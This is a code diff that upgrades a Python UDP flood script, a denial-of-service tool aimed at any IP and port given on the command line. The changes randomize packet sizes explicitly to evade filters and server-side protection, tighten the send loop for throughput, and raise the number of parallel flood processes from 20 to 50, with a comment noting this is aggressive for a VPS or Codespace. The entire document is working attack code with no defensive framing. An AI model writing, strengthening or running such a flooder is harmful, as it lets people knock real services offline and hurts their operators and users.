@@ -3,20 +3,24 @@ import multiprocessing
 import time
 import sys
 import random
+import os
 
 def flood(target, port, duration):
-    # Prepare a random packet of 1024 bytes
-    data = random._urandom(1024)
+    # Prepare multiple packets of different sizes to bypass simple filters
+    payloads = [random._urandom(size) for size in range(512, 1024, 64)]
     end_time = time.time() + duration
     
-    # Use a faster loop by checking time less frequently
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while True:
-        if time.time() > end_time:
-            break
-        for _ in range(100): # Send 100 packets before checking time again
+    # Most efficient way to send in Python: pre-bind or use zero-copy if possible
+    # We use a tight loop with a local reference for speed
+    sendto = client.sendto
+    
+    while time.time() < end_time:
+        # Send 200 packets per timing check to maximize throughput
+        for _ in range(200):
             try:
-                client.sendto(data, (target, port))
+                # Randomize payload to confuse server-side protection
+                sendto(random.choice(payloads), (target, port))
             except:
                 pass
     client.close()
@@ -29,9 +33,10 @@ if __name__ == "__main__":
     target_ip = sys.argv[1]
     target_port = int(sys.argv[2])
     duration_secs = int(sys.argv[3])
-    num_processes = 20  # Use 20 processes for maximum power
+    # 50 processes is very aggressive for a standard VPS/Codespace
+    num_processes = 50 
 
-    print(f"Starting HIGH POWER flood on {target_ip}:{target_port} for {duration_secs} seconds...")
+    print(f"🚀 EXTREME POWER Mode: Starting 50 parallel flood processes on {target_ip}:{target_port}...")
     
     processes = []
     for _ in range(num_processes):
@@ -39,6 +44,8 @@ if __name__ == "__main__":
         p.start()
         processes.append(p)
 
+    # Wait for all processes to complete
     for p in processes:
         p.join()
-    print("Flood finished.")
+        
+    print("✅ Extreme Flood Finished.")
